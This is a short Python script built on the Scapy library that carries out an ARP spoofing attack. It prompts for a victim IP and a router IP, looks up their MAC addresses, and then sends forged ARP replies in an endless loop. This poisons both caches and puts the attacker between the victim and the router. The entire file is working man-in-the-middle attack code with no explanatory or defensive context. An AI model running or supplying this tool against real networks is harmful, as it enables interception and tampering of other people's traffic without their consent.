import sys
import os
from scapy.all import *

interfaceIP = raw_input("Enter interface IP")
victimIP = raw_input("Enter windows IP")
routerIP = raw_input("Enter router IP")

def MACsnag(IPAddress):
    ans, uans = arping(IPAddress)
    for s,r in ans:
        return r[Ether].src
        
def arpSpoof():
    interfaceMAC = MACsnag(interfaceIP)
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    while(True):
        send(ARP(op=2, pdst=victimIP,psrc=routerIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=routerIP,psrc=victimIP, hwdst=routerMAC))
        
def main():
    arpSpoof()
    
main()    
        
